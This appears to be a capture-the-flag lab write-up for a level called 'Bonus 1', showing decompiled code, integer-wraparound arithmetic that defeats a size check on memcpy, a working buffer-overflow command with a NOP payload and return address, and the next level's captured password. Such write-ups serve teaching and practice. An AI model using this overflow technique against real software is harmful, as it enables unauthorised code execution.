# Bonus 1
*password : cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9*

## Analyze
```
$ scp -P 4242 bonus1@192.168.56.108:bonus1 binary/
```
```
char *dest[40];
...
memcpy(dest,*(undefined4 *)(**av + 8),nb * 4);
```

## Buffer overflow : memcpy expoit

- nb must be < 10
- compute offset : 8 * 2 + 40 = 56
- we want : (unsigned int)(nb * 4) = 60

unsigned int MAX = 4294967296

(unsigned int)-4294967296 = 0\
(unsigned int)(-1073741824 * 4) = 0\
(unsigned int)((-1073741824 + x / 4)* 4) = x

so for x = 60 :\
(unsigned int)((-1073741824 + 15)* 4) = 60\
(unsigned int)(-1073741809 * 4) = 60\
`nb  = -1073741809`

```
$ tmp/a.out
0xbffff83f
$ ./bonus1 -1073741809 $(python -c 'print "\x90" * 56 + "\x3f\xf8\xff\xbf"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
